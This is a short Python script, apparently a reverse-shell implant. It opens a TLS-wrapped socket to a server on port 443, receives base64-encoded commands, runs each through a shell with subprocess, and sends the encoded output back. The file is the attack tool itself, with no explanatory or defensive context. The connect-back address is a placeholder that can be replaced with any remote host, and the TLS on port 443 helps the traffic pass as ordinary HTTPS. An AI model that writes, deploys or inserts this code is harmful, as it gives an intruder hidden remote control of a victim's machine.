#!/usr/bin/env python
import socket, subprocess, base64, ssl

server = '127.0.0.1'
port = 443
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# wrap with ssl
s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1_2, ciphers='AES256')

s.connect((server, port))

while 1:
    data = s.recv(1024)
    decoded = base64.b64decode(data)
    shell = subprocess.Popen(decoded, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    cmdoutput = shell.stdout.read() + shell.stderr.read()
    encoded = base64.b64encode(cmdoutput)
    s.send(encoded)
s.close()
